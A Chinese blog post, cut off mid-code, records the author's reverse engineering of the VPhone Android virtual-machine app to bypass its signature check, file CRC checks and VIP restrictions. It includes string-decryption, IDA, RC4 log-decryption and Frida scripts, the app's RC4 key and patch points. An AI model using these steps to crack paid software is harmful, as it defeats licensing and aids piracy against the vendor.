      <link href="/2022/08/30/VPhone-Reverse/"/>
      <url>/2022/08/30/VPhone-Reverse/</url>
      
        <content type="html"><![CDATA[<div class="note info flat"><p><strong>2022-10-20更新</strong></p><p>最近有些人@我让我教他们教程具体怎么操作，我感到奇怪并问他们怎么回事，因为我没有对外发布过这篇文章，这只是我逆向实战的一个研究记录。然后我发现这个教程已经出现在了很多平台上，这让我感到非常惊讶，因为<strong>作者没有在任何论坛或群聊等公开发布过这篇文章</strong>。如果那些地方有人称自己是作者，那么他那句话一定是假的。当然如果有人想走一遍教程并且学习相关知识，却碰到教程中的遗漏和错误，欢迎来咨询我（Q1837009039）。但如果你只需要最后的破解结果，那你找错人了，<strong>作者不提供破解成品</strong>，实在需要的话找那些走教程破解成功的人吧，他们走一遍教程而且弄对也挺不容易的。这篇文章需要你具备一些IDA和Python的知识，如果你不知道这些是什么，可以找除我以外的其他人帮忙。破解适用于版本2.4.0(3327)和当前最新版3.0.0(3328,3330)，但估计下一个版本官方会加入更多的防破解措施，所以如果你很期待APP的新功能的话，我<strong>推荐购买正版</strong>，花很大劲去整一个盗版软件不值得。而这篇教程也会成为历史，且看且珍惜吧。</p></div><p>之前需要动态调试几个apk，于是准备在电脑上装一个安卓模拟器。但是我需要经常用到wsl，而它需要开启hyper-v功能，众所周知这个功能与大部分的安卓模拟器冲突。一开始我安装了wsa（windows安卓子系统），可惜的是它的兼容性不是很好，而且对于ida的动态调试，经常无法命中断点，而且看不到寄存器的状态，后面又尝试了几个能与hyper-v共存的模拟器，都有类似的问题。我怀疑是android_server的锅，然后拿gdbserver又试了一下，看到了下面的提示信息：</p><p><img src="/pictures/VPhone-Reverse/01.png" alt="gdbserver的错误报告"></p><p>gdbserver也获取不到寄存器，猜测是架构的问题，在电脑上找模拟器这条路就放弃了。</p><p>于是我又去试了真机调试，能做到，但还是想要一个能root的设备，所以我安装了vmos pro，在设置中打开网络adb，也能够进行调试。然而vmos的root总感觉怪怪的，我调试apk时，想用gg修改器导出内存，但它始终检测不到root的存在，一直卡在启动界面。然后我去找了其他的虚拟机，发现这个光速虚拟机能正常用root，而且支持magisk和安卓10，这正好能解决打ctf时一些应用SDK版本高于模拟器安卓支持的最高版本导致不能启动的问题。但应用启动时广告很多，而且大部分特性仅限会员，在网上也找不到比较新的破解版，然后就想自己尝试一下，就诞生了这篇文章。</p><h2 id="Java层初探"><a href="#Java层初探" class="headerlink" title="Java层初探"></a>Java层初探</h2><p>我下载的版本是当前的最新版2.4.0，与上一版本2.3.1相比它新增一个多开管理的功能，于是就想从这个版本入手。先什么也不改，对应用直接签名，结果启动时出现<code>initialize feature fail(51)</code>错误，那应该就有什么验签机制。</p><p><img src="/pictures/VPhone-Reverse/02.png" alt="启动失败"></p><p>用mt管理器自带的去除签名校验处理了一下，发现并不可行。在classes.dex中搜索base64字符串，结果只发现了微信SDK的签名，这个应该不是我们想要的，那验签逻辑应该在native层了。再看一眼Java层代码，发现这个应用并没有进行名称混淆，一些类似<code>isVip</code>字样的方法名十分的显眼：</p><p><img src="/pictures/VPhone-Reverse/03.png" alt="逆向的代码"></p><p>那么看来过签后vip的破解会比较轻松，于是就想着把验签的逻辑找出来就万事大吉了<del>事实证明我这个想法还是太太太太年轻了</del>。</p><h2 id="Native层—签名验证"><a href="#Native层—签名验证" class="headerlink" title="Native层—签名验证"></a>Native层—签名验证</h2><p>通过对几个so文件的观察，猜测可能的so有4个：<code>libuserkernel*.so</code>和<code>libVPhoneGaGaLib.so</code>，其他so要么太小，要么名称在网上可以直接搜到（比如<code>libp7zip.so</code>），应该不会有验签逻辑：</p><p><img src="/pictures/VPhone-Reverse/04.png" alt="native文件"></p><p>其中前者有3个版本，分别是两个32位版和一个64位版（为什么有两个32位版我现在还没弄清楚）。<code>libVPhoneGaGaLib.so</code>文件最大，于是就先从这个so入手。</p><p>用IDA打开这个文件，发现代码中布满了这样的操作：</p><p><img src="/pictures/VPhone-Reverse/05.png" alt="字符串加密"></p><p>这很明显是字符串加密，随便解了几个，字符串的内容大概有函数的名称，日志文本之类的。然而我们不可能一个个进行处理。经过观察，我发现很多这种加密文本的代码段都有这样的格式：</p><ul><li><p>把一些数放到寄存器中</p></li><li><p>把寄存器中的数写入栈内</p></li><li><p>for循环，对字符逐个异或解密，解密方法有两类：<code>x ^= i + c</code>和<code>x ^= c</code>。<code>c</code>是一个常数，<code>i</code>是字符的位置。</p></li></ul><p>可以用这种模式去遍历整个代码段，找到它们的位置，然后用Unicorn模拟执行引擎来解一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"><span class="keyword">from</span> elftools.elf.elffile <span class="keyword">import</span> ELFFile, Section</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> Cs, CS_ARCH_ARM64, CS_MODE_ARM</span><br><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.arm64_const <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(argv) &gt;= <span class="number">2</span></span><br><span class="line">so = ELFFile(<span class="built_in">open</span>(argv[<span class="number">1</span>], <span class="string">&#x27;rb&#x27;</span>))</span><br><span class="line">section: Section = so.get_section_by_name(<span class="string">&#x27;.text&#x27;</span>)</span><br><span class="line">base: <span class="built_in">int</span> = section.header.sh_addr</span><br><span class="line">code = section.data()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">State</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self._ops = <span class="built_in">set</span>(<span class="string">&#x27;mov str movz ldp ldr adrp add sub movi ldrh and strh orr ldrb subs ldurb ldur strb eor sturb lsr movn movk csinc madd ubfx asr mul cmn lsl nop cinc ext sxtw smaddl fcvtzs udiv msub smull ldrsw smulh adds mvn neg sturh umull csneg umov sshll sdiv ldrsb stlrb bfi ands sxtb ushl umaddl umulh sxth bic orn ror rev sbfiz ldursw bfxil sbfx ldpsw ldrsh&#x27;</span>.split())</span><br><span class="line">        self._pat = (<span class="string">&#x27;ldrb ldr add eor strb add cmp b.ne&#x27;</span>, <span class="string">&#x27;ldrb ldr eor strb add cmp b.ne&#x27;</span>, <span class="string">&#x27;ldrb ldur add eor strb add cmp b.ne&#x27;</span>, <span class="string">&#x27;ldrb ldur eor strb add cmp b.ne&#x27;</span>)</span><br><span class="line">        self._pat = <span class="built_in">tuple</span>(<span class="built_in">tuple</span>(item.split()) <span class="keyword">for</span> item <span class="keyword">in</span> self._pat)</span><br><span class="line">        self._step = [<span class="number">0</span>] * <span class="built_in">len</span>(self._pat)</span><br><span class="line">        self._<span class="built_in">set</span> = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">self, addr, op</span>):</span></span><br><span class="line">        match = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> op <span class="keyword">in</span> self._ops:</span><br><span class="line">            self._<span class="built_in">set</span>.add(addr)</span><br><span class="line">        <span class="keyword">for</span> i, pat <span class="keyword">in</span> <span class="built_in">enumerate</span>(self._pat):</span><br><span class="line">            <span class="keyword">if</span> op == pat[self._step[i]]:</span><br><span class="line">                self._step[i] += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>: self._step[i] = <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> self._step[i] == <span class="built_in">len</span>(pat):</span><br><span class="line">                self._step[i] = <span class="number">0</span></span><br><span class="line">                <span class="keyword">assert</span> match <span class="keyword">is</span> <span class="literal">None</span></span><br><span class="line">                match = i</span><br><span class="line">        <span class="keyword">if</span> match <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            pos = <span class="literal">None</span></span><br><span class="line">            end = addr - <span class="number">4</span> * <span class="built_in">len</span>(self._pat[match]) + <span class="number">4</span></span><br><span class="line">            <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(end - <span class="number">4</span>, -<span class="number">4</span>, -<span class="number">4</span>):</span><br><span class="line">                <span class="keyword">if</span> p <span class="keyword">in</span> self._<span class="built_in">set</span>:</span><br><span class="line">                    pos = p</span><br><span class="line">                <span class="keyword">else</span>: <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">assert</span> pos <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span></span><br><span class="line">            <span class="keyword">return</span> pos, end</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DataRecorder</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.reset()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reset</span>(<span class="params">self</span>):</span></span><br><span class="line">        self._current = <span class="literal">None</span></span><br><span class="line">        self._data = <span class="literal">None</span></span><br><span class="line">        self.enable = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hit</span>(<span class="params">self, addr, data</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.enable:</span><br><span class="line">            <span class="keyword">if</span> self._current <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                self._current = addr</span><br><span class="line">                self._data = <span class="built_in">bytearray</span>()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self._current += <span class="number">1</span></span><br><span class="line">                <span class="keyword">assert</span> addr == self._current</span><br><span class="line">            self._data.append(data)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">finish</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = self._data.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">            data = <span class="built_in">bytes</span>(self._data)</span><br><span class="line">        self.reset()</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">onmemwrite</span>(<span class="params">uc: Uc, kind: <span class="built_in">int</span>, addr: <span class="built_in">int</span>, size: <span class="built_in">int</span>, value: <span class="built_in">int</span>, dr: DataRecorder</span>):</span></span><br><span class="line">    <span class="keyword">if</span> kind == UC_MEM_WRITE:</span><br><span class="line">        <span class="keyword">assert</span> size == <span class="number">1</span> <span class="keyword">or</span> <span class="keyword">not</span> dr.enable</span><br><span class="line">        dr.hit(addr, value)</span><br><span class="line">        uc.mem_write(addr, <span class="built_in">int</span>.to_bytes(value &amp; (<span class="number">1</span> &lt;&lt; (size &lt;&lt; <span class="number">3</span>)) - <span class="number">1</span>, size, <span class="string">&#x27;little&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>: <span class="keyword">assert</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">uc = Uc(UC_ARCH_ARM64, UC_MODE_ARM)</span><br><span class="line">uc.mem_map(base, (<span class="built_in">len</span>(code) + <span class="number">0xFFF</span>) // <span class="number">0x1000</span> * <span class="number">0x1000</span>, UC_PROT_READ | UC_PROT_EXEC)</span><br><span class="line">uc.mem_write(base, code)</span><br><span class="line">stack = (base + <span class="built_in">len</span>(code) + <span class="number">0x1000</span>) // <span class="number">0x1000</span> * <span class="number">0x1000</span></span><br><span class="line">stack_size = <span class="number">0x100000</span></span><br><span class="line">uc.mem_map(stack, stack_size, UC_PROT_READ | UC_PROT_WRITE)</span><br><span class="line">uc.reg_write(UC_ARM64_REG_SP, stack)</span><br><span class="line">dr = DataRecorder()</span><br><span class="line">uc.hook_add(UC_HOOK_MEM_WRITE, onmemwrite, dr, stack, stack + stack_size - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">state = State()</span><br><span class="line">cs = Cs(CS_ARCH_ARM64, CS_MODE_ARM)</span><br><span class="line">current = base</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> current != base + <span class="built_in">len</span>(code):</span><br><span class="line">    <span class="keyword">for</span> addr, _, op, operand <span class="keyword">in</span> cs.disasm_lite(code[current-base:], current):</span><br><span class="line">        current = addr</span><br><span class="line">        result = state.update(addr, op)</span><br><span class="line">        <span class="keyword">if</span> result <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            start, mid = result</span><br><span class="line">            end = addr + <span class="number">4</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;found encrypted string at 0x%X 0x%X 0x%X: &#x27;</span> % (*result, end), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                uc.emu_start(start, mid)</span><br><span class="line">                dr.enable = <span class="literal">True</span></span><br><span class="line">                uc.emu_start(mid, end)</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">repr</span>(dr.finish()))</span><br><span class="line">            <span class="keyword">except</span> (UcError, AssertionError) <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">repr</span>(e))</span><br><span class="line">                dr.reset()</span><br><span class="line">    current += <span class="number">4</span></span><br></pre></td></tr></table></figure><p>简单解释一下思路：代码逐句反编译后，脚本会识别解密循环的固定模式，然后向前（小地址方向）尽可能长地匹配除跳转指令等以外的所有指令，这样就能把解密字符串时的寄存器状态最大程度还原出来。每识别到一个这样的模式，就让Unicorn先运行循环前的代码，这时栈中字符已经放置好了，然后开启写内存的记录器，再来运行循环代码，于是栈上的字符被逐个解密，我们也通过hook知道了解密后的字符序列。运行脚本之后，的确解出了不少字符串：</p><p><img src="/pictures/VPhone-Reverse/06.png" alt="解密的字符串"></p><p>然而这种方法无法应对一些情况。原因是这些字符串的解密代码都是C++动态生成的，既然是编译器，那它想怎么做就怎么做，只要最后生成的代码能达到目的就行，而我们只能识别一些固定模式。例如一个字符串过短时，C++编译时自动展开循环，就没有for的过程，我们就检测不到；又或者C++认为这个解密函数不应该内联，那for循环代码就变成了函数调用，我们也检测不到；还有一种是寄存器在很早以前就赋值了，但我们在Unicorn中模拟执行的时候不知道这一点，结果执行时输出错误结果或者直接报错，就像上图那样。循环展开这种情况比较好解决：直接IDA Ctrl+F5导出全部代码，IDA会帮我们自动还原字符串。剩下的情况现在我还没有想到什么好的办法。总结下来，这个脚本能解密出来的字符串还不到二分之一，但这个解密结果对接下来的逆向分析帮助还是很大的。</p><p>先写个IDA脚本，把这些字符串中看着像方法名的给函数重新命名，成功还原了一百来个方法名：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re, idaapi</span><br><span class="line"></span><br><span class="line">raw = <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">raw, namef, mapf = raw.splitlines(), <span class="built_in">set</span>(), &#123;&#125;</span><br><span class="line">pat = re.<span class="built_in">compile</span>(<span class="string">&#x27;.*?0x([\dA-Fa-f]+): .*?([A-Za-z_][A-Za-z\d_]*::[A-Za-z_][A-Za-z\d_]*).*?&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> raw:</span><br><span class="line">    match = pat.fullmatch(line)</span><br><span class="line">    <span class="keyword">if</span> match <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        addr, name = <span class="built_in">int</span>(match.group(<span class="number">1</span>), <span class="number">16</span>), match.group(<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> namef:</span><br><span class="line">            mapf[addr] = name</span><br><span class="line">            namef.add(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> addr, name <span class="keyword">in</span> mapf.items():</span><br><span class="line">    func: idaapi.func_t = idaapi.get_func(addr)</span><br><span class="line">    addr = func.start_ea</span><br><span class="line">    idaapi.set_name(addr, name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;0x%x -&gt; %s&#x27;</span> % (addr, name))</span><br></pre></td></tr></table></figure><p><img src="/pictures/VPhone-Reverse/07.png" alt="还原的函数"></p><p>然后我们直接搜索应用提示启动失败的字符串，找到了一个，在<code>Engine::StartEngine</code>函数中：</p><p><img src="/pictures/VPhone-Reverse/08.png" alt="验签提示"></p><p>往前翻到上一个分支，那么验签的主要函数就找到了，把它随便命名一下，然后点开函数，往下一滑就找到了一个<code>memcmp</code>函数：</p><p><img src="/pictures/VPhone-Reverse/09.png" alt="验签结果"></p><p>通过对<code>0x4DBF22</code>处的内容进行分析，结合长度为<code>0x14</code>这一特征，可以发现这是签名的SHA1值。那么后面就简单了，修改函数返回值或者<code>0x4DBF22</code>处的数据即可过签。</p><h2 id="Native层—数据验证"><a href="#Native层—数据验证" class="headerlink" title="Native层—数据验证"></a>Native层—数据验证</h2><p>然而实际上修改后再安装发现，应用进入后会直接黑屏。。。但是如果我们不去修改<code>classes.dex</code>文件又不会黑屏（但是会出现购买vip的弹窗）。通过对几个文件的修改得知，如果修改下列文件之一，应用就会黑屏：<code>classes.dex</code>，<code>classes2.dex</code>，<code>classes3.dex</code>，<code>AndroidManifest.xml</code>。即使只在<code>AndroidManifest.xml</code>后面再加几个字节也会黑屏，所以猜测应用对这几个关键文件有另一个验证机制。然后在so中继续找了很久，还是没有什么头绪。在找的过程中看了很多函数，如果碰到有加密字符串的，就手动解密字符串并且还原函数名，还有一些函数名是根据它的行为猜测的（这些函数一般以<code>xxx</code>开头，而且会注明），所以后文如果看到一些莫名其妙的函数名，不用感到奇怪。</p><p>在一开始过签失败的弹窗中可以发现，这个应用会生成一些加密的日志。于是我很好奇应用的日志打印在哪，和它的解密方式，分析之后发现日志在<code>/sdcard/Android/data/com.vphonegaga.titan/files/instanceX/logs</code>中，日志记录方式如下<del>一大片红请忽略</del>：</p><p><img src="/pictures/VPhone-Reverse/10.png" alt="写出日志"></p><p><code>log_encode</code>函数就是加密过程（函数名随便起的），通过简单分析，可以看出这是RC4加密，密码是<code>unhexlify(&#39;206DEA86C313F2E3&#39;)</code>。先写个解密脚本试试：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"><span class="keyword">import</span> os, re</span><br><span class="line"></span><br><span class="line">pat = re.<span class="built_in">compile</span>(<span class="string">&#x27;^(\[\d+\])&#123;2&#125;\[(\d\d:)&#123;2&#125;\d\d.\d&#123;3&#125;\]: &#x27;</span>, re.M)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">dir</span>, _, files <span class="keyword">in</span> os.walk(<span class="string">&#x27;patch/logs&#x27;</span>):</span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> <span class="built_in">map</span>(<span class="keyword">lambda</span> x: os.path.join(<span class="built_in">dir</span>, x), files):</span><br><span class="line">        rc = ARC4.new(unhexlify(<span class="string">&#x27;206DEA86C313F2E3&#x27;</span>))</span><br><span class="line">        <span class="keyword">if</span> file.endswith(<span class="string">&#x27;.log&#x27;</span>):</span><br><span class="line">            data = rc.decrypt(<span class="built_in">open</span>(file, <span class="string">&#x27;rb&#x27;</span>).read()).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            data = pat.sub(<span class="string">&#x27;&#x27;</span>, data)</span><br><span class="line">            <span class="built_in">open</span>(file, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>).write(data)</span><br></pre></td></tr></table></figure><p>成功解密出4个日志文件：</p><p><img src="/pictures/VPhone-Reverse/11.png" alt="日志"></p><p>然后看看黑屏与不黑屏的日志有什么不同。可以使用<code>git diff file1 file2</code>直观的比对文件内容。比对下来发现两次<code>titan.log</code>除了顺序不同并无异常，<code>AndroidLog.log</code>是虚拟机内部应用的日志，<code>UserKernelApi.log</code>只有几行，只有<code>UserKernel.log</code>中有几百行，而且尽是些不认识的符号，简单分析发现这是<code>libuserkernel*.so</code>中的日志，使用<code>git diff</code>发现一处不明所以的差异：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@1637@@678@0</span><br></pre></td></tr></table></figure><p>于是尝试性地打开了<code>libuserkernel64.so</code>，定位到这条字符串处：</p><p><img src="/pictures/VPhone-Reverse/12.png" alt="可疑代码"></p><p>然后查看<code>sub_18B758</code>，翻到最后，发现下面的代码：</p><p><img src="/pictures/VPhone-Reverse/13.png" alt="验证逻辑"></p><p>通过前面的代码发现应用运行时会把<code>0x3213C0</code>处的一些片段异或<code>0x86</code>，那我们也尝试异或一下，结果豁然开朗：这个函数会对<code>META-INF/KEY0.RSA</code>、<code>AndroidManifest.xml</code>、<code>classes.dex</code>、<code>classes2.dex</code>、<code>classes3.dex</code>、<code>META-INF/KEY0.SF</code>进行长度和CRC的校验（如果CRC=0就不验证，因为第一个和最后一个文件是签名相关文件，在应用打包之前内容是未知的，没办法验证）。那么我们把对应CRC的位置都改成0即可，但是注意<code>libuserkernel*.so</code>有三个，它们都需要改。改完以后验证成功通过。</p><h2 id="Native层—VIP验证"><a href="#Native层—VIP验证" class="headerlink" title="Native层—VIP验证"></a>Native层—VIP验证</h2><p>光速虚拟机的安卓ROM有两个，分别是安卓7和安卓10。破解前面两处校验后，再次打包运行，发现安卓7能正常使用了，但是安卓10界面点不动，悬浮窗中的导航键也没反应，而悬浮窗中的“展开通知栏”功能是可以正常使用的。这个问题我找字符串无从下手，因为此现象无法提供更多信息，然后我对着so逆了很久，最后只知道触摸输入最后传到了<code>0x240FA8</code>处，悬浮窗输入传到了<code>0x95490</code>处。于是简单学了下frida入门教程，边学边用，尝试拦截并记录运行时函数的调用信息。一路跟着函数调用，我发现应用最后把输入数据包传到了<code>pipe_stream::write_fully(0x27369C)</code>中。这个函数的第一个参数是<code>this</code>指针，第二、三个是发送的数据和长度。函数调用<code>sendto</code>函数把数据包发送出去，可以在发送前调用libc函数查看传入<code>sendto</code>的文件描述符：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getPathById</span>(<span class="params">fd</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (readlink === <span class="literal">undefined</span>)&#123;</span><br><span class="line">        <span class="keyword">let</span> readlink_addr = Module.findExportByName(<span class="string">&#x27;libc.so&#x27;</span>, <span class="string">&#x27;readlink&#x27;</span>)</span><br><span class="line">        readlink = <span class="keyword">new</span> NativeFunction(readlink_addr, <span class="string">&#x27;ssize_t&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;size_t&#x27;</span>])</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> path = Memory.allocUtf8String(<span class="string">`/proc/self/fd/<span class="subst">$&#123;fd&#125;</span>`</span>)</span><br><span class="line">    <span class="keyword">let</span> buf = Memory.alloc(<span class="number">256</span>)</span><br><span class="line">    <span class="keyword">let</span> retLen = readlink(path, buf, <span class="number">256</span>)</span><br><span class="line">    <span class="keyword">if</span> (retLen &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;getPathById: readlink fails&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> buf.readUtf8String(retLen)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打印结果显示这是一个socket，用<code>netstat -ax</code>查看，发现这是一个unix domain socket。用这个函数获取socket的名字：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getSocketNameById</span>(<span class="params">fd</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getsockname === <span class="literal">undefined</span>)&#123;</span><br><span class="line">        <span class="keyword">let</span> getsockname_addr = Module.findExportByName(<span class="string">&#x27;libc.so&#x27;</span>, <span class="string">&#x27;getsockname&#x27;</span>)</span><br><span class="line">        getsockname = <span class="keyword">new</span> NativeFunction(getsockname_addr, <span class="string">&#x27;int&#x27;</span>, [<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>])</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> addr = Memory.alloc(<span class="number">256</span>)</span><br><span class="line">    <span class="keyword">let</span> retLen = Memory.alloc(<span class="number">4</span>).writeUInt(<span class="number">256</span>)</span><br><span class="line">    <span class="keyword">let</span> ret = getsockname(fd, addr, retLen)</span><br><span class="line">    <span class="keyword">if</span> (ret !== <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;getSocketNameById: getsockname fails&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> name = addr.add(<span class="number">3</span>).readUtf8String(retLen.readUInt() - <span class="number">3</span>)</span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到的结果是<code>titan-pipe-1-input-qwerty</code>。再用下面的代码找到这个socket的对端：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getSocketTarget</span>(<span class="params">fd</span>)</span>&#123; <span class="comment">// 